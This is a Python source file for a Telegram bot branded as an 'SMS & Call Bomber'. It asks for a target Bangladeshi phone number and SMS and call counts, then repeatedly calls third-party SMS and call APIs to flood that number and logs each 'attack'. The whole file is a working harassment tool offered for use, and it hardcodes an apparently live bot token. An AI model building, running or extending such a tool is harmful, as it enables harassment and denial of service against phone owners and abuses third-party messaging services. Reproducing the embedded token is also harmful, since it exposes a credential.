from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
import aiohttp
import asyncio
import logging
import random
from datetime import datetime
import json

# Bot Configuration
BOT_TOKEN = "7619796671:AAFLnz5d1SSh1jhJakaoR7Ny9dXNWMT_0qA"
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# States for ConversationHandler
ASK_NUMBER, ASK_SMS_LIMIT, ASK_CALL_LIMIT, CONFIRM = range(4)
user_data = {}

# Gorgeous Dark Theme Welcome Message
WELCOME_MESSAGE = (
    "🌑 *SM - The Dark Storm Bomber* 🌑\n"
    "Unleash chaos with elegance! 💣📞\n"
    "Click *Launch Attack* to ignite the storm.\n"
    "⚠️ *Use with caution.*"
)

# API Endpoints (Enhanced with Call APIs)
SMS_API_ENDPOINTS = [
    "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}",
    # Add more SMS APIs here
]
CALL_API_ENDPOINTS = [
    "https://call-bomber-api.example.com/call?phone={number}",
    # Add more Call APIs here
]

# ASCII Art for Gorgeous Dark Vibe
BANNER = """
🔮═══════════════════════🔮
       SM - DARK STORM
   💣 SMS & CALL BOMBER 💣
🔮═══════════════════════🔮
"""

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start with a stunning dark-themed interface."""
    reply_keyboard = [["🔮 Launch Attack"]]
    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(
        BANNER + "\n" + WELCOME_MESSAGE,
        parse_mode="Markdown",
        reply_markup=markup
    )
    return ASK_NUMBER

async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Request target number."""
    if update.message.text != "🔮 Launch Attack":
        await update.message.reply_text("🌙 Select *Launch Attack* to proceed!", parse_mode="Markdown")
        return ASK_NUMBER

    await update.message.reply_text(
        "📲 Enter target number (Format: 01XXXXXXXXX or 8801XXXXXXXXX):",
        parse_mode="Markdown"
    )
    return ASK_SMS_LIMIT

async def ask_sms_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Request SMS blast count."""
    number = update.message.text.strip()

    if number.startswith("01") and len(number) == 11:
        number = "880" + number
    elif number.startswith("8801") and len(number) == 13:
        pass
    else:
        await update.message.reply_text("❌ Invalid number! Use: 01XXXXXXXXX or 8801XXXXXXXXX", parse_mode="Markdown")
        return ASK_SMS_LIMIT

    user_data[update.effective_chat.id] = {"number": number}
    await update.message.reply_text(
        "💥 How many SMS to unleash? (Max 100)",
        parse_mode="Markdown"
    )
    return ASK_CALL_LIMIT

async def ask_call_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Request call blast count."""
    try:
        sms_limit = int(update.message.text.strip())
        if sms_limit < 1 or sms_limit > 100:
            await update.message.reply_text("⚠️ Enter 1-100 SMS!", parse_mode="Markdown")
            return ASK_CALL_LIMIT
    except ValueError:
        await update.message.reply_text("❌ Enter a valid SMS count!", parse_mode="Markdown")
        return ASK_CALL_LIMIT

    user_data[update.effective_chat.id]["sms_limit"] = sms_limit
    await update.message.reply_text(
        "📞 How many calls to storm? (Max 50)",
        parse_mode="Markdown"
    )
    return CONFIRM

async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm and execute SMS and call bombing."""
    try:
        call_limit = int(update.message.text.strip())
        if call_limit < 1 or call_limit > 50:
            await update.message.reply_text("⚠️ Enter 1-50 calls!", parse_mode="Markdown")
            return CONFIRM
    except ValueError:
        await update.message.reply_text("❌ Enter a valid call count!", parse_mode="Markdown")
        return CONFIRM

    chat_id = update.effective_chat.id
    number = user_data.get(chat_id, {}).get("number")
    sms_limit = user_data.get(chat_id, {}).get("sms_limit")

    if not number or not sms_limit:
        await update.message.reply_text("😵‍💫 Restart with /start", parse_mode="Markdown")
        return ConversationHandler.END

    user_data[chat_id]["call_limit"] = call_limit

    confirm_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Ignite Storm", callback_data=f"confirm_{chat_id}")],
        [InlineKeyboardButton("❌ Abort", callback_data=f"cancel_{chat_id}")]
    ])
    await update.message.reply_text(
        f"🌀 *Target*: {number}\n"
        f"💥 *SMS*: {sms_limit}\n"
        f"📞 *Calls*: {call_limit}\n"
        f"Ready to dominate?",
        parse_mode="Markdown",
        reply_markup=confirm_keyboard
    )
    return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle confirmation/cancellation and execute bombing."""
    query = update.callback_query
    await query.answer()

    chat_id = query.message.chat_id
    data = query.data.split("_")
    action = data[0]

    if action not in ["confirm", "cancel"] or int(data[1]) != chat_id:
        await query.message.reply_text("❌ Invalid action!", parse_mode="Markdown")
        return

    if action == "cancel":
        await query.message.reply_text("🛑 Storm aborted.", parse_mode="Markdown")
        user_data.pop(chat_id, None)
        return

    number = user_data.get(chat_id, {}).get("number")
    sms_limit = user_data.get(chat_id, {}).get("sms_limit")
    call_limit = user_data.get(chat_id, {}).get("call_limit")

    await query.message.reply_text(
        f"🌩️ *Storm Initiated!*\n"
        f"Targeting {number} with {sms_limit} SMS and {call_limit} calls...",
        parse_mode="Markdown"
    )

    # SMS Bombing
    sms_success, sms_fail = 0, 0
    async with aiohttp.ClientSession() as session:
        for _ in range(sms_limit):
            for api in SMS_API_ENDPOINTS:
                try:
                    async with session.get(api.format(number=number), timeout=10) as resp:
                        if resp.status == 200:
                            sms_success += 1
                        else:
                            sms_fail += 1
                        await asyncio.sleep(2)  # 2-second delay
                except Exception as e:
                    logger.error(f"SMS API error: {e}")
                    sms_fail += 1

    # Call Bombing
    call_success, call_fail = 0, 0
    async with aiohttp.ClientSession() as session:
        for _ in range(call_limit):
            for api in CALL_API_ENDPOINTS:
                try:
                    async with session.get(api.format(number=number), timeout=10) as resp:
                        if resp.status == 200:
                            call_success += 1
                        else:
                            call_fail += 1
                        await asyncio.sleep(2)  # 2-second delay
                except Exception as e:
                    logger.error(f"Call API error: {e}")
                    call_fail += 1

    # Save attack log
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "number": number,
        "sms_limit": sms_limit,
        "sms_success": sms_success,
        "sms_failed": sms_fail,
        "call_limit": call_limit,
        "call_success": call_success,
        "call_failed": call_fail
    }
    try:
        with open("attack_log.json", "a") as f:
            json.dump(log_entry, f)
            f.write("\n")
    except Exception as e:
        logger.error(f"Log write error: {e}")

    await query.message.reply_text(
        f"🌑 *Storm Concluded!*\n"
        f"💥 SMS - Success: {sms_success}, Failed: {sms_fail}\n"
        f"📞 Calls - Success: {call_success}, Failed: {call_fail}",
        parse_mode="Markdown"
    )
    user_data.pop(chat_id, None)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the operation."""
    await update.message.reply_text("🛑 Operation halted.", parse_mode="Markdown")
    user_data.pop(update.effective_chat.id, None)
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors gracefully."""
    logger.error(f"Update {update} caused error {context.error}")
    if update and hasattr(update, 'message') and update.message:
        await update.message.reply_text(
            "😵‍💫 Error struck! Restart with /start",
            parse_mode="Markdown"
        )

def main() -> None:
    """Run the bot."""
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_number)],
            ASK_SMS_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_sms_limit)],
            ASK_CALL_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_call_limit)],
            CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_attack)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    app.run_polling()

if __name__ == "__main__":
    main()
